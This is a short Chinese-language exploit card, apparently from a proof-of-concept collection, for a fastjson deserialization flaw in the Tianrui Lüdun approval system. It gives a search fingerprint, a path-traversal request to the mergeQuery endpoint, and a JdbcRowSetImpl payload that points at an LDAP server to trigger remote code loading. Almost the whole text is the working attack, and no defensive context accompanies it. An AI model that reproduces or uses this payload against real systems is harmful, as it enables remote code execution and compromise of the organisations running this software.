# 天锐绿盾审批系统extmergeQuery存在fastjson反序列化漏洞

天锐绿盾 ｜ 反序列化 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/login.jsp/.%2e/rest/ext/mergeQuery HTTP/1.1`

**Payload**
```
[
"requestType": "trusteeMsg",
"requestBody": {
"userId": {
"@type": "com.sun.rowset.JdbcRowSetImpl",
"dataSourceName": "ldap://192.168.168.11:50389/165c51",
"autoCommit": true
},
"createTime": "2026-01-01"
]
```
- **响应特征**：200